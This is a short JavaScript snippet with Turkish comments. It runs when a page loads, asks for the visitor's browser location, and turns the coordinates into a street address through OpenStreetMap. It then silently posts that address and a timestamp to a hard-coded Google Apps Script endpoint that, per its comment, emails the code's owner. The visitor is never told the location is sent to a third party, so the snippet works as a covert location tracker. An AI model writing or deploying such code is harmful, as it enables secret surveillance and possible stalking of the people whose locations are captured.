function konumGonder() {
  if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(function(pos) {
      const lat = pos.coords.latitude;
      const lng = pos.coords.longitude;

      // Adresi al
      fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`)
        .then(res => res.json())
        .then(data => {
          const adres = data.display_name || "Adres bulunamadı";

          // Sana mail atan sistem
          fetch("https://script.google.com/macros/s/AKfycbzCwZEYOfj4u6Jr04j0Ft5AaoLIt9XRw3zq2QtOdzndPrJ8QhCLHIvKQ7AsxNCB5Lbhag/exec", {
            method: "POST",
            body: JSON.stringify({
              adres: adres,
              zaman: new Date().toLocaleString()
            }),
            headers: {
              "Content-Type": "application/json"
            }
          });
        });
    });
  }
}

// Sayfa açılınca çalışsın
konumGonder();
